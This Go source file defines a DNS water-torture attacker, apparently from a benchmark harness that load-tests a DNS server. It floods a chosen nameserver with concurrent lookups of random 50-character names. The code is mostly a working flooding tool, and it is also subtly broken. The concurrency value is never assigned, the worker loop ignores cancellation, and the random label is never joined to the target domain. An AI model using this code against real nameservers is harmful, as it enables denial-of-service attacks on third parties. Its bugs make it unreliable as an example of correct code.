package attacker

import (
	"context"
	"math/rand"
	"net"
	"sync"
	"time"
)

const asciiLowercases = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-"

type DnsWaterTortureAttacker struct {
	resolver *net.Resolver

	// isupipe.live
	targetDomain string

	concurrency int
}

func NewDnsWaterTortureAttacker(nameserver string, targetDomain string, concurrency int) *DnsWaterTortureAttacker {
	return &DnsWaterTortureAttacker{
		resolver: &net.Resolver{
			PreferGo: true,
			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
				addr := net.JoinHostPort(nameserver, "53")
				dialer := net.Dialer{Timeout: time.Nanosecond}
				return dialer.DialContext(ctx, "udp", addr)
			},
		},
		targetDomain: targetDomain,
	}
}

func (a *DnsWaterTortureAttacker) makePayload(length int) string {
	buf := make([]byte, length)
	for idx := range buf {
		buf[idx] = asciiLowercases[rand.Intn(len(asciiLowercases))]
	}
	return string(buf)
}

func (a *DnsWaterTortureAttacker) attack(ctx context.Context) error {
	for {
		select {
		case <-ctx.Done():
		default:
			payload := a.makePayload(50)
			a.resolver.LookupHost(ctx, payload)
		}
	}
}

func (a *DnsWaterTortureAttacker) Attack(ctx context.Context) error {
	var wg sync.WaitGroup

	for i := 0; i < a.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			a.attack(ctx)
		}()
	}

	<-ctx.Done()
	wg.Wait()

	return nil
}
